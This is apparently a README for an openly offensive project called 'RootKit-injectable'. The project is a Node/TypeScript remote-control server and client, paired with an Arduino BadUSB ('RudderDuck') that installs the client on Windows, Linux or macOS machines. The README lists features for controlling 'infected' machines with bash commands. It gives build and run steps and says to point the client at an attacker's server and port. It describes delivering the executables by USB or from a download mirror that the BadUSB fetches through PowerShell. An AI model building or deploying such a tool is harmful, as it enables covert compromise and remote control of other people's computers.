<h1 align="center">RootKit-injectable</h1>

<p align="center">
  <a href="#about">About</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
  <a href="#technologies">technologies</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
  <a href="#Features">Features</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
  <a href="#Run">Transpile, Compile and Run</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
  <a href="#license">License</a>
</p>

## :notebook: About

<div id="about"></div>

Rootkit injectable by windowns, linux, or macOs. injectable by executable or USB RudderDuck

## technologies 🐱‍🏍🎂

<div id="technologies"></div>

- [Node](http://nodejs.org/) - Nodejs
- [typescript](https://www.typescriptlang.org/) - Super Javascript
- [C/C++](https://cplusplus.com/) - Arduino 
- [Webpack](https://webpack.js.org/) - Transpiler Javascript

### Features

<div id="Features"></div>

- [x] Server - Controll Infect machine with Bash commands
- [x] Client - Controll Process and Execute bash commands sent Server and send return
- [x] RudderDuck - Micro Arduino/Arduino Leonardo inject machine with Rootkit and exe in background  

## Transpile, Compile and Run

<div id="Run"></div>

Transpile Typescript to JavaScript and run - Server
```
npm run buildCompileServer
node dist/Server.js
```

Transpile Typescript to JavaScript and run - Client
```
Change -> /src/modules/Client/Client.ts:6 to You Server IP and Server Port: Exemple: vps.machine.com:1337 or localhost:1337 or 127.0.0.0:1337

npm run buildCompileServer

Executables Ready to run in machine or insert in RudderDuck USB with SD Card or Make it available on a download mirror and configure rudderduck to download it from powershell/Terminal

dist/Client-win.exe -> Windowns
dist/Client-linux -> Linux
dist/Client-macos -> MacOs
```

RudderDuck - BADUSB to inject program
```
open your Arduino IDE
Set your Arduino setting
Verific and Upload to board
Inject USB in Computer windowns;
```

## License

<div id="license"></div>

MIT [LICENSE](LICENSE.md)
